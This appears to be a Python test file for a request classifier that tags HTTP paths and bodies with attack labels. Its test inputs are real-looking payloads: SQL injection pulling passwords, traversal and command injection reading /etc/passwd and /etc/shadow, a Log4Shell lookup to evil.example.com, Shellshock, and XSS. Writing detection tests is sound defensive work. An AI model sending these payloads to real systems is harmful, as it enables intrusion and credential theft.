from apps.events import ttp


def test_no_match_returns_empty():
    assert ttp.classify("/admin/", None) == []


def test_sql_injection_in_path():
    tags = ttp.classify("/products?id=1 UNION SELECT password FROM users", None)
    assert "sql_injection" in tags


def test_path_traversal():
    assert "path_traversal" in ttp.classify("/download?file=../../../../etc/passwd", None)


def test_log4shell_in_body():
    body = '{"user": "${jndi:ldap://evil.example.com/a}"}'
    assert "rce_log4shell" in ttp.classify("/api/login", body)


def test_shellshock_in_body():
    assert "rce_shellshock" in ttp.classify("/cgi-bin/x", "() { :; }; /bin/cat /etc/passwd")


def test_xss():
    assert "xss" in ttp.classify("/search?q=<script>alert(1)</script>", None)


def test_credential_access_dotenv():
    assert "credential_access" in ttp.classify("/.env", None)


def test_scanner_tooling():
    assert "scanner_tooling" in ttp.classify("/?x=sqlmap", None)


def test_multiple_tags_sorted_and_deduped():
    body = "../../etc/passwd and ' OR 1=1 -- and ../../etc/passwd again"
    tags = ttp.classify("/x", body)
    assert tags == sorted(tags)
    assert len(tags) == len(set(tags))
    assert {"path_traversal", "sql_injection"} <= set(tags)


def test_body_and_path_both_scanned():
    # path is clean, body carries the signature
    assert "command_injection" in ttp.classify("/clean/path", "name=foo; cat /etc/shadow")


def test_percent_encoded_sqli_in_query_string():
    path = "/api/debug/?id=1%20UNION%20SELECT%20password%20FROM%20users"
    assert "sql_injection" in ttp.classify(path, None)


def test_plus_encoded_sqli_in_query_string():
    path = "/api/debug/?id=1+UNION+SELECT+password+FROM+users"
    assert "sql_injection" in ttp.classify(path, None)


def test_encoded_path_traversal():
    assert "path_traversal" in ttp.classify("/download?file=..%2f..%2f..%2fetc%2fpasswd", None)


def test_raw_match_survives_decoding():
    # A literal '+' that decodes to a space must not drop an already-raw match.
    assert "xss" in ttp.classify("/s?q=<script>alert(1)</script>+more", None)
